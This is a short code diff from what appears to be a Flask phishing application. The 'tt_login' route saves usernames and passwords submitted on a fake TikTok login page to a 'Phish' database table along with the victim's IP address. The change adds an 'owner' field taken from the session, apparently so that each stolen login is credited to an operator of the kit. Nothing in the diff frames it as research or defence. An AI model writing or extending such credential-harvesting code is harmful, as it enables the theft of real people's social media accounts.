@@ -1,5 +1,5 @@
 from app import db, app
-from flask import render_template, request
+from flask import render_template, request, session
 
 from app.main.config.models import Phish
 
@@ -10,6 +10,7 @@ def tt_login():
     elif request.method == 'POST':
         data = request.form.to_dict()
         user_phished = Phish(platform='Tiktok',
+                             owner=session["curr"],
                              phised_user=data["username"],
                              phished_pword=data["password"],
                              ip=request.remote_addr)
